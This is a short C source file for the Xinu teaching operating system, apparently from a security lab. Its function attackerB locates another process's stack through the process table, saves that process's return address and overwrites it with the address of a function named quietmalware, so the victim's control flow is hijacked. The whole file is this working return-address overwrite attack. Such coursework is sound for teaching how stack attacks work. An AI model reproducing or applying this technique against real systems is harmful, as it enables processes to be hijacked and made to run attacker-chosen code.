#include <xinu.h>

extern void quietmalware(void);

unsigned long victimRet;

void attackerB(int y){
	unsigned long * victimSP = (unsigned long *)proctab[getpid()-y].prstkptr;	// Get the pointer to the stack
	unsigned long * victimBP = victimSP + 2;					// Get base pointer
	unsigned long * victimSleepBP = (unsigned long *) *victimBP;			// Get the base pointer for the sleep
	unsigned long * attackAddress = victimSleepBP + 1;				// Get the pointer to the address to modify
	victimRet = *attackAddress;							// Save victim return address to return to victim after quietmalware is done
	*attackAddress = (unsigned long)&quietmalware;					// Set address to our malware function
}
